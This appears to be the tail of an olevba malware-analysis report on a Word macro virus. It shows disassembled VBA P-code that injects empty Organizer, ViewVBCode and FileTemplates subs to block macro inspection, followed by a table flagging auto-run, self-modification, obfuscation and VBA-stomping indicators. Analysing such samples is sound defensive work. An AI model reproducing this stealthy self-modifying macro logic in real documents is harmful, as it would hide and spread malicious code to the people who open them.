' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #206:
' 	LitStr 0x000D "Sub Organizer"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #207:
' 	LitStr 0x000E "Sub ViewVBCode"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #208:
' 	LitStr 0x0011 "Sub FileTemplates"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #209:
' Line #210:
' 	EndIfBlock 
' Line #211:
' 	Label Phuck 
' Line #212:
' 	EndSub 
' Line #213:
' Line #214:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

